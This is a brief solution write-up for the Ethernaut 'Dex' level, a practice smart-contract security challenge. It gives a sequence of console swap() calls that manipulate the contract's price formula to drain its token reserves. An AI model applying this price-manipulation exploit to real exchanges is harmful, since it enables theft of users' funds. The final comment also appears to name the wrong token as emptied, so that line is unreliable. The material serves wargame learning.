[22 - Dex](https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008)

Token1: 0x42259ce074f426E5FBac1bbE270707cBeada3Fa8
Token2: 0x0dcfF8e59a9cD5f4d90EF977a454C0f1F61c082E

* await contract.approve(contract.address, 10000000);
* await contract.swap("0x42259ce074f426E5FBac1bbE270707cBeada3Fa8", "0x0dcfF8e59a9cD5f4d90EF977a454C0f1F61c082E", 10);
* await contract.swap("0x0dcfF8e59a9cD5f4d90EF977a454C0f1F61c082E", "0x42259ce074f426E5FBac1bbE270707cBeada3Fa8", 10);
* await contract.swap("0x0dcfF8e59a9cD5f4d90EF977a454C0f1F61c082E", "0x42259ce074f426E5FBac1bbE270707cBeada3Fa8", 10);
* const token1 = await contract.token1(); const token2 = await contract.token2();
* await contract.swap(token1, token2, 21);
* await contract.swap(token2, token1, 25);
* await contract.swap(token1, token2, 32);
* await contract.swap(token2, token1, 45);
* await contract.swap(token1, token2, 76);
* contract has 34 token1, 110 token2, player has 76 token1, 0 token2
* await contract.swap(token1, token2, 34);
* now contract will have 0 token1, and will report a bad price



